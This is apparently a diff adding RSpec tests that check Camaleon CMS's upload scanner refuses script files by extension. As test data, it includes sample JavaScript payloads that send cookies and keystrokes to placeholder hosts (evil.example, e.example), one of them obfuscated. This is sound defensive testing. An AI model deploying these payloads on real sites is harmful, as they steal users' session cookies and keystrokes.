@@ -179,6 +179,44 @@ RSpec.describe CamaleonCms::UploaderContentSecurity do
     end
   end
 
+  describe 'executable script' do
+    # The refusal is by extension, not by inspecting the script, because inspecting it cannot work:
+    # every one of these payloads is ordinary JavaScript doing ordinary JavaScript things, and a
+    # legitimate uploaded library is indistinguishable from them by any static rule.
+    {
+      'cookie exfiltration' => %(fetch('https://evil.example/c?'+document.cookie)),
+      'a keylogger' => %(document.addEventListener('keydown',e=>navigator.sendBeacon('//e.example',e.key))),
+      'an obfuscated fetch' => %(window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])),
+      'the Function constructor' => %([]['constructor']['constructor']('return 1')())
+    }.each do |label, payload|
+      it "refuses #{label}" do
+        expect(scanner).to be_content_unsafe(payload, filename: 'x.js')
+      end
+    end
+
+    %w[js mjs cjs wasm swf].each do |extension|
+      it "refuses a .#{extension} upload" do
+        expect(scanner).to be_content_unsafe('console.log(1)', filename: "lib.#{extension}")
+      end
+    end
+
+    it 'refuses an uppercase script extension' do
+      expect(scanner).to be_content_unsafe('console.log(1)', filename: 'lib.JS')
+    end
+
+    it 'refuses a bare script dotfile name' do
+      expect(scanner).to be_content_unsafe('console.log(1)', filename: '.js')
+    end
+
+    it 'refuses an empty script file, since the content is never consulted' do
+      expect(scanner).to be_content_unsafe('', filename: 'lib.js')
+    end
+
+    it 'does not refuse a filename that merely contains js' do
+      expect(scanner).not_to be_content_unsafe('plain notes', filename: 'notes-js.txt')
+    end
+  end
+
   describe 'compressed markup' do
     def gzip(payload)
       buffer = StringIO.new(+'', 'wb')
